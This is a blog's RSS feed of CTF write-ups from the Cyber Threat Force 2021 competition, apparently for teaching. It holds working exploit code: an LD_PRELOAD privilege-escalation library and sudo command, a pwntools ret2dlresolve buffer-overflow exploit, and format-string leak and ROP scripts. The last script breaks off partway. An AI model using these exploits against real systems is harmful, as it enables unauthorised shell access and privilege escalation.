@@ -1,0 +1,598 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>pwn on Nicolas Bourras</title><link>https://nicolasb.fr/tags/pwn/</link><description>Recent content in pwn on Nicolas Bourras</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 08 Jul 2021 04:10:09 +0100</lastBuildDate><atom:link href="https://nicolasb.fr/tags/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>Writeup Cyber Threat Force : PrivEsc</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/</link><pubDate>Thu, 08 Jul 2021 04:10:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/</guid><description>For this challenge, we were given SSH access to a machine, as the user ctf. After running sudo -l, we quickly find that we can run the /opt/Ivazov binary as ctf_cracked. The user in question has a flag.txt file in their home, which only they can read.
+We also notice env_keep += LD_PRELOAD. From there, we can try an LD_PRELOAD exploit. The steps taken here are copied from the guide was was just linked.</description><content>&lt;p>For this challenge, we were given SSH access to a machine, as the user &lt;code>ctf&lt;/code>. After running &lt;code>sudo -l&lt;/code>, we quickly find that we can run the &lt;code>/opt/Ivazov&lt;/code> binary as &lt;code>ctf_cracked&lt;/code>. The user in question has a &lt;code>flag.txt&lt;/code> file in their home, which only they can read.&lt;/p>
+&lt;p>We also notice &lt;code>env_keep += LD_PRELOAD&lt;/code>. From there, we can try an &lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload">LD_PRELOAD exploit&lt;/a>. The steps taken here are copied from the guide was was just linked.&lt;/p>
+&lt;p>We save this code in &lt;code>/tmp/pe.c&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>
+&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">_init&lt;/span>() {
+unsetenv(&lt;span style="color:#e6db74">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>);
+setgid(&lt;span style="color:#ae81ff">0&lt;/span>);
+setuid(&lt;span style="color:#ae81ff">0&lt;/span>);
+system(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We compile and run it:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cd /tmp
+$ &lt;span style="color:#75715e"># write the code to pe.c&lt;/span>
+$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+$ sudo -u ctf_cracked LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>pe.so /opt/Ivazov
+$ &lt;span style="color:#75715e"># shell as ctf_cracked&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we can now cat &lt;code>/home/ctf_cracked/flag.txt&lt;/code>: &lt;code>CYBERTF{LD_PRELOAD_2_Bypass_Ivazov}&lt;/code>.&lt;/p>
+&lt;p>You can &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : bof_3</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/</link><pubDate>Thu, 08 Jul 2021 02:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/</guid><description>For this challenge, we also were given a service executable. It was hosted remotely.
+NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
+$ checksec ./service [*] &amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) $ ./service password: mypassword nop NX enabled, and partial RELRO. Let&amp;rsquo;s take a look at the binary using Ghidra:
+undefined4 main(void) { ignorMe(&amp;amp;stack0x00000004); puts(&amp;#34;password: &amp;#34;); vuln(); puts(&amp;#34;nop&amp;#34;); return 0; } void vuln(void) { undefined local_70 [104]; read(0,local_70,0x96); return; } We have an overflow, but not much else going on.</description><content>&lt;p>For this challenge, we also were given a service executable. It was hosted remotely.&lt;/p>
+&lt;p>NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ checksec ./service
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39;&lt;/span>
+Arch: i386-32-little
+RELRO: Partial RELRO
+Stack: No canary found
+NX: NX enabled
+PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x8048000&lt;span style="color:#f92672">)&lt;/span>
+$ ./service
+password:
+mypassword
+nop
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>NX enabled, and partial RELRO. Let&amp;rsquo;s take a look at the binary using Ghidra:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined4 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+ignorMe(&lt;span style="color:#f92672">&amp;amp;&lt;/span>stack0x00000004);
+puts(&lt;span style="color:#e6db74">&amp;#34;password: &amp;#34;&lt;/span>);
+vuln();
+puts(&lt;span style="color:#e6db74">&amp;#34;nop&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+undefined local_70 [&lt;span style="color:#ae81ff">104&lt;/span>];
+read(&lt;span style="color:#ae81ff">0&lt;/span>,local_70,&lt;span style="color:#ae81ff">0x96&lt;/span>);
+&lt;span style="color:#66d9ef">return&lt;/span>;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have an overflow, but not much else going on. We won&amp;rsquo;t be able to leak an address from the libc using a format string exploit, like on &lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2">the last challenge&lt;/a>.&lt;/p>
+&lt;p>We can try the &lt;a href="https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve">ret2dlresolve&lt;/a> technique. Pwntools even has a nice module for it.&lt;/p>
+&lt;p>I found the offset using &lt;code>cyclic&lt;/code> from pwntools.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
+context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
+context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
+&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
+r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
+&lt;span style="color:#66d9ef">else&lt;/span>:
+r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;XXX.XXX.XXX.XXX&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
+&lt;span style="color:#66d9ef">return&lt;/span> r
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+r &lt;span style="color:#f92672">=&lt;/span> conn()
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>recvline()
+offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">112&lt;/span>
+rop &lt;span style="color:#f92672">=&lt;/span> ROP(exe)
+dlresolve &lt;span style="color:#f92672">=&lt;/span> Ret2dlresolvePayload(exe, symbol&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;system&amp;#34;&lt;/span>, args&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>])
+rop&lt;span style="color:#f92672">.&lt;/span>read(&lt;span style="color:#ae81ff">0&lt;/span>, dlresolve&lt;span style="color:#f92672">.&lt;/span>data_addr)
+rop&lt;span style="color:#f92672">.&lt;/span>ret2dlresolve(dlresolve)
+raw_rop &lt;span style="color:#f92672">=&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain()
+r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: bytes(rop)}))
+r&lt;span style="color:#f92672">.&lt;/span>sendline(dlresolve&lt;span style="color:#f92672">.&lt;/span>payload)
+r&lt;span style="color:#f92672">.&lt;/span>interactive()
+&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+main()
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py LOCAL
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39;&lt;/span>
+Arch: i386-32-little
+RELRO: Partial RELRO
+Stack: No canary found
+NX: NX enabled
+PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x8048000&lt;span style="color:#f92672">)&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">846530&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Loaded &lt;span style="color:#ae81ff">10&lt;/span> cached gadgets &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#e6db74">&amp;#39;./service&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
+$ pwd
+/home/vivescere/ctf/bof_3
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{Zeroleak@nd_bruteF0rc3}&lt;/code>. It was in &lt;code>/home/ctf/flag.txt&lt;/code>.&lt;/p>
+&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof3">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : bof_2 (with PrivEsc)</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/</link><pubDate>Wed, 07 Jul 2021 20:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/</guid><description>For this challenge, we were also given a service executable. It was also hosted remotely.
+NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
+Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments $ ./service Hello authentifie toi ! Username: vivescere Bienvenue vivescere password: mypassword oops i have lost my db sorry This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable.</description><content>&lt;p>For this challenge, we were also given a &lt;code>service&lt;/code> executable. It was also hosted remotely.&lt;/p>
+&lt;p>NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.&lt;/p>
+&lt;h2 id="level-1">Level 1&lt;/h2>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ checksec service
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39;&lt;/span>
+Arch: i386-32-little
+RELRO: Partial RELRO
+Stack: No canary found
+NX: NX disabled
+PIE: PIE enabled
+RWX: Has RWX segments
+$ ./service
+Hello authentifie toi !
+Username: vivescere
+Bienvenue vivescere
+password: mypassword
+oops i have lost my db sorry
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable. We can take a look at the the binary in Ghidra:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined4 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+ignorMe(&lt;span style="color:#f92672">&amp;amp;&lt;/span>stack0x00000004);
+vuln();
+puts(&lt;span style="color:#e6db74">&amp;#34;oops i have lost my db sorry&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+undefined &lt;span style="color:#f92672">*&lt;/span>puVar1;
+size_t sVar2;
+&lt;span style="color:#66d9ef">int&lt;/span> iVar3;
+uint uVar4;
+undefined4 &lt;span style="color:#f92672">*&lt;/span>puVar5;
+byte bVar6;
+&lt;span style="color:#66d9ef">char&lt;/span> cStack130;
+undefined local_81 [&lt;span style="color:#ae81ff">76&lt;/span>];
+undefined4 uStack53;
+undefined local_31 [&lt;span style="color:#ae81ff">17&lt;/span>];
+undefined4 uStack32;
+undefined auStack28 [&lt;span style="color:#ae81ff">12&lt;/span>];
+bVar6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+puts(&lt;span style="color:#e6db74">&amp;#34;Hello authentifie toi !&amp;#34;&lt;/span>);
+printf(&lt;span style="color:#e6db74">&amp;#34;Username: &amp;#34;&lt;/span>);
+local_31._0_4_ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+uStack32 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+puVar1 &lt;span style="color:#f92672">=&lt;/span> (undefined &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>;
+&lt;span style="color:#66d9ef">do&lt;/span> {
+&lt;span style="color:#f92672">*&lt;/span>(undefined4 &lt;span style="color:#f92672">*&lt;/span>)(puVar1 &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)(local_31 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+puVar1 &lt;span style="color:#f92672">=&lt;/span> puVar1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
+} &lt;span style="color:#66d9ef">while&lt;/span> (puVar1 &lt;span style="color:#f92672">&amp;lt;&lt;/span> auStack28 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span>)(local_31 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>));
+local_81._0_4_ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+uStack53 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+uVar4 &lt;span style="color:#f92672">=&lt;/span> (uint)(local_31 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span>)(local_81 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
+puVar5 &lt;span style="color:#f92672">=&lt;/span> (undefined4 &lt;span style="color:#f92672">*&lt;/span>)(local_81 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
+&lt;span style="color:#66d9ef">while&lt;/span> (uVar4 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+uVar4 &lt;span style="color:#f92672">=&lt;/span> uVar4 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;span style="color:#f92672">*&lt;/span>puVar5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+puVar5 &lt;span style="color:#f92672">=&lt;/span> puVar5 &lt;span style="color:#f92672">+&lt;/span> (uint)bVar6 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+}
+fgets(local_81,&lt;span style="color:#ae81ff">0x50&lt;/span>,stdin);
+sVar2 &lt;span style="color:#f92672">=&lt;/span> strlen(local_81);
+(&lt;span style="color:#f92672">&amp;amp;&lt;/span>cStack130)[sVar2] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+printf(&lt;span style="color:#e6db74">&amp;#34;Bienvenue &amp;#34;&lt;/span>);
+printf(local_81);
+printf(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">password: &amp;#34;&lt;/span>);
+__isoc99_scanf(&lt;span style="color:#f92672">&amp;amp;&lt;/span>DAT_00012042,local_31);
+iVar3 &lt;span style="color:#f92672">=&lt;/span> strcmp(local_31,local_81);
+&lt;span style="color:#66d9ef">if&lt;/span> (iVar3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+puts(&lt;span style="color:#e6db74">&amp;#34;WTF ?&amp;#34;&lt;/span>);
+}
+&lt;span style="color:#66d9ef">return&lt;/span>;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>There is an obvious call to &lt;code>printf&lt;/code> with &lt;code>local_81&lt;/code>, which we can use in a format string exploit, and a call to &lt;code>scanf&lt;/code>, which we&amp;rsquo;ll use for our buffer overflow.&lt;/p>
+&lt;p>Starting with figuring out the offset:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cyclic &lt;span style="color:#ae81ff">100&lt;/span>
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+$ gdb ./service
+...
+gef➤ r
+Starting program: /home/vivescere/ctf/bof_2/service
+Hello authentifie toi !
+Username: a
+Bienvenue a
+password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+...
+────────────────────────────────────────────────────────────────────────────────────── threads ────
+&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#75715e">#0] Id 1, Name: &amp;#34;service&amp;#34;, stopped 0x6e616161 in ?? (), reason: SIGSEGV&lt;/span>
+──────────────────────────────────────────────────────────────────────────────────────── trace ────
+───────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤ q
+$ cyclic -l 0x6e616161
+&lt;span style="color:#ae81ff">49&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we need to figure out the version of the libc that was used on the remote server. To do that, we&amp;rsquo;re going to leak a few addresses from the stack.&lt;/p>
+&lt;p>Using a simple script (could also have been done in GDB), we can find out which addresses come from the libc (knowing that on my system and for this executable, the libc starts at &lt;code>0xf7cad000&lt;/code>).&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
+exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>False)
+context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
+context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
+&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span>):
+r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(i)&lt;span style="color:#f92672">.&lt;/span>encode() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;$p-&amp;#39;&lt;/span>)
+greeting &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
+&lt;span style="color:#66d9ef">try&lt;/span>:
+leaked_addr &lt;span style="color:#f92672">=&lt;/span> int(greeting&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode(), &lt;span style="color:#ae81ff">16&lt;/span>)
+&lt;span style="color:#66d9ef">except&lt;/span>:
+leaked_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> hex(leaked_addr)&lt;span style="color:#f92672">.&lt;/span>startswith(&lt;span style="color:#e6db74">&amp;#39;0xf7&amp;#39;&lt;/span>):
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(i)&lt;span style="color:#f92672">.&lt;/span>encode() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;$p&amp;#39;&lt;/span>, hex(leaked_addr))
+r&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can quickly identify the addresses that we get using GDB (&lt;code>info symbol [addr]&lt;/code>):&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">%2$p 0xf7f64540 _IO_2_1_stdin_
+...
+%43$p 0xf7dc0a0d __libc_start_main
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>.. now we can do the same on the remote host, and plug the values into the &lt;a href="https://libc.blukat.me">libc database search&lt;/a> website. After entering these values:&lt;/p>
+&lt;pre>&lt;code>__libc_start_main_ret -&amp;gt; b41
+_IO_2_1_stdin_ -&amp;gt; 5c0
+&lt;/code>&lt;/pre>&lt;p>We get four possible versions. I tested them all until one worked (using the exploit below). The correct version (or at least a compatible one) was &lt;code>libc6-i386_2.28-10_amd64&lt;/code>.&lt;/p>
+&lt;p>Now that we know all of this, the exploit needs to 1. leak an address so that we can defeat ASLR and 2. build a simple ropchain to pop a shell.&lt;/p>
+&lt;p>Here is the exploit script:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
+context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
+context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
+&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
+r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
+&lt;span style="color:#66d9ef">else&lt;/span>:
+r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;XXX.XXX.XXX.XXX&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
+&lt;span style="color:#66d9ef">return&lt;/span> r
+&lt;span style="color:#75715e"># libc6-i386_2.28-10_amd64&lt;/span>
+libc_config &lt;span style="color:#f92672">=&lt;/span> {
+&lt;span style="color:#e6db74">&amp;#39;io_2_1_stdin&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">0x001da5c0&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">0x0003e9e0&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;str_bin_sh&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">0x17eaaa&lt;/span>,
+}
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+r &lt;span style="color:#f92672">=&lt;/span> conn()
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%2$p-&amp;#39;&lt;/span>)
